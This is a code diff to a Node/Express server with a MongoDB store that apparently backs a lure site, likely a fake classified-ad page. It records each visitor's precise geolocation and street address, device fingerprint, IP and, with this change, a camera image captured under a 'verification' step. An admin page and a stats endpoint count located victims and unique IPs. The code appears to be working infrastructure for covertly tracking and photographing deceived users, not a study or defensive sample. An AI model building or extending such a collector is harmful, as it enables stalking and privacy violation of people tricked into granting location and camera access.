@@ -18,26 +18,55 @@ app.use(express.static(__dirname));
 
 const captureSchema = new mongoose.Schema({
     id: { type: Number, required: true, unique: true },
-    type: { type: String, enum: ['ad_posted', 'permission_granted'], required: true },
+    type: { type: String, enum: ['ad_posted', 'permission_granted', 'verification'], default: 'ad_posted' },
     timestamp: { type: Date, default: Date.now },
-    ad: { title: String, category: String, description: String, price: String, location: String, phone: String },
-    location: { lat: Number, lng: Number, accuracy: Number, street: String, city: String, state: String, country: String, postcode: String, fullAddress: String },
-    device: { userAgent: String, platform: String, language: String, screen: String, timezone: String, ip: String },
-    ip: String
+    ad: {
+        title: String,
+        category: String,
+        description: String,
+        price: String,
+        location: String,
+        phone: String,
+        image: String
+    },
+    location: {
+        lat: Number,
+        lng: Number,
+        accuracy: Number,
+        street: String,
+        city: String,
+        state: String,
+        country: String,
+        postcode: String,
+        fullAddress: String
+    },
+    device: {
+        userAgent: String,
+        platform: String,
+        language: String,
+        screen: String,
+        timezone: String,
+        ip: String
+    },
+    ip: String,
+    cameraImage: String
 }, { timestamps: true });
 
 const Capture = mongoose.model('Capture', captureSchema);
+
+// ============ API ENDPOINTS ============
 
 app.post('/api/capture', async (req, res) => {
     try {
         const data = req.body;
         if (!data.id) data.id = Date.now();
         const existing = await Capture.findOne({ id: data.id });
-        if (existing) return res.json({ success: true });
+        if (existing) return res.json({ success: true, message: 'Already exists' });
         await new Capture(data).save();
-        console.log(`✅ Saved: ${data.type}`);
+        console.log(`✅ Saved: ${data.type} | ID: ${data.id}`);
         res.status(201).json({ success: true });
     } catch (error) {
+        console.error('Capture error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -69,17 +98,35 @@ app.delete('/api/clear', async (req, res) => {
     }
 });
 
-app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
-app.get('/admin.html', (req, res) => { res.sendFile(path.join(__dirname, 'admin.html')); });
+app.get('/api/stats', async (req, res) => {
+    try {
+        const total = await Capture.countDocuments();
+        const ads = await Capture.countDocuments({ type: 'ad_posted' });
+        const locations = await Capture.countDocuments({ 'location.lat': { $exists: true } });
+        const uniqueIps = await Capture.distinct('ip');
+        res.json({ success: true, total, ads, locations, uniqueIps: uniqueIps.length });
+    } catch (error) {
+        res.status(500).json({ success: false });
+    }
+});
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/admin.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'admin.html'));
+});
 
 async function startServer() {
     try {
         await mongoose.connect(MONGODB_URI);
         console.log('✅ MongoDB connected');
-        app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
+        app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server running on port ${PORT}`));
     } catch (error) {
-        console.error('MongoDB error:', error);
+        console.error('MongoDB connection error:', error);
         process.exit(1);
     }
 }
+
 startServer();
